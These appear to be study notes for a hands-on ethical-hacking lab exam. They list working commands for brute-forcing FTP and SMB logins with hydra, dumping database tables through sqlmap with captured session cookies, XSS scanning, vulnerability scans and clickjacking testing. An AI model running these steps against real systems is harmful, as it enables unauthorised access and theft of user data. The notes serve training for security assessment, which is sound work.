# Test website for clickjacking
If ClickJackPOC.py doesn't work, try www.clickjacker.io

# Finding HTTP and Web servers for websites
- Can use http-recon
- If site isn't reachable with the tool, try opening it with firefox or chrome
- Press F12 -> Network tab -> Refresh page
- Look under response headers

# Cracking FTP Credentials
- REMEMBER THERE ARE PROVIDED WORDLISTS
- Check both the one on Desktop and in Module 13 in Parrot Machine
- nmap -p 21 192.168.0.0/24
- sudo nmap -sS -A -T5 <target_ip>/24
- hydra -L user.txt -P pass.txt ftp://<target_ip>

# Finding Load Balancing Svc
1. dig <site> -> Take sites from ANSWER SECTION
2. lbd <answer_site>

# CMS
Content management system refers to the system used by the website (eg. WordPress, SquareSpace)

# Banner Grabbing
wget <ip> -q -S (gives etag)
- Make sure to use an actual ip and not a hostname

# Web application snooping
- Use Burp Suite and setup a proxy to observe the structure

# Check for XSS
- Navigate to PwnXSS folder
- python3 pwnxss.py -u <url>

# SQL Injection Attack
The question asks to get number of users and gave login credentials
- Login to target site and select "View Profile"
- Open Developer tools (F12), go to console and type "document.cookie"
- Eg. "mscope=*********; ui-tabs-1=0"
- Open a terminal
- sqlmap -u "<current_url>" --cookie="mscope=*********;" --dbs
    - Returns all available databases 
    - (Eg. we're selecting moviescope)
- sqlmap -u "<current_url>" --cookie="mscope=*********; ui-tabs-1=0" -D moviescope --tables
    - Returns all tables 
    - (Eg. we want User_Login)
- sqlmap -u "<current_url>" --cookie="mscope=*********; ui-tabs-1=0" -D moviescope -T User_Login --dump
    - Returns a list of all content in that table
    - (Eg. This table has 9 users)

# SQL Injection Attack (Part 2)
Given a web application, find a value in a db table
- Access the website via the url and copy the url that has a parameter (eg. id=1)
- On Parrot OS, Applications -> Pentesting -> Exploitation Tools -> Web Apps -> jSQL Injection
- Paste URL and click attack
- Search acquired DBs for the value

# SQL Injection Parameter Tampering
If looking for values in a web app such as page_id=##
1. nmap -sV --script=http-enum <target_ip>
2. Use burp suite to capture requets when entering things into any text field
3. Open Body Parameters(or any input parameter) and add some text "1 OR ANY TEXT"
4. Save the file by right clicking on burp and then select save to file
5. sqlmap -r <burp.txt> --dbs
    - Select a database
6. sqlmap -r <burp.txt> -D <database_name> --tables
    - Select a table
7. sqlmap -r <burp.txt> -D <database_name> -T <table_name> --columns
8. sqlmap -r <burp.txt> -D <database_name> -T <table_name> --dump-all
9. Go back to url and edit it to get page_id=##

# Detect Session Hijacking
- Open .pcap file in Wireshark
- Filter by ARP and see there is a lot of requests

# SMB Hacking Example
Machine has SMB service enabled in 192.168.0.0/24 subnet. Gain access with the user adam and obtain the target file. Decode the file with adam's password.
1. sudo nmap -T5 -Ss -P 139,445 --script vuln 192.168.0.0/24
    - nmap scan smb ports and see which one is vulnerable
2. hydra -l adam -P pass.txt <target_ip> smb
3. smbclient //<target_ip>/share
    - Access the smb share folder
4. smbclient -L <target_ip>
    - List all files
5. get target.txt
6. You can use BCTextEncoder on Windows machine to decrpyt the message